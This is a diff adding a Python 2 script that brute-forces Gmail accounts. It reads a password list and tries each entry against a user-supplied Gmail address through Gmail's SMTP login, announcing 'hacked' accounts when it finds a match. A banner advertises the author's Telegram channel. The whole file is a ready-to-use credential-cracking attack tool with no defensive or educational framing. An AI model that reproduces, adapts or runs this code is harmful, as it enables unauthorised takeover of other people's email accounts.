@@ -1,0 +1,61 @@
+import smtplib
+from os import system
+from colorama import Fore as C
+import os
+os.system('clear')
+def main():
+ print  
+ print C.MAGENTA+'+---------------------------------------------+'
+ print '|[+]MY CHAANEL TELEGRAM: @ELF_SECURITY_CYBER  |'
+ print '|[+]MY ID TELEGRAM: @E_L_F_6_6_6              |'
+ print '|[+]MY GITHUB: github.com/elf-cyber           |'
+ print '+---------------------------------------------+'
+ print '|               |Instructions|                |'
+ print '+---------------------------------------------+'
+ print '|1) ENTER THE NAME PASSWORD LIST..!           |'
+ print '|2) ENTER THE GIMAL TARGET..!                 |'
+ print '|3) ENTER & RUN FOR CRACK GIMAL..!            |'
+ print '+---------------------------------------------+'
+
+
+
+
+
+main()
+print C.BLUE+'[1]RUN TO CRACK'
+print C.BLUE+'[2]EXIT'
+option = input('[$]ENTER THE NUMBER: ')
+if option == 1:
+   file_path = raw_input(C.GREEN+'ENTER THE NAME FILE PASSWORD LIST :')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input(C.CYAN+'ENTER THE GMAIL :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print C.GREEN+'[+]Find the password ==>' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print C.GREEN+'[+]Find the password '+C.CYAN+'(hacked accaant) ==>'+C.YELLOW+ password + C.WHITE+'\nMY CHANNELL:'+C.GREEN+'@ELF_SECURUTY_CYBER'+C.WHITE+' \n MY ID:'+C.GREEN+' @E_L_F_6_6_6'
+
+            break
+         else:
+            print C.YELLOW+ '>>>IS NOT PASSWORD ==>' +C.RED+ password
+login()
+
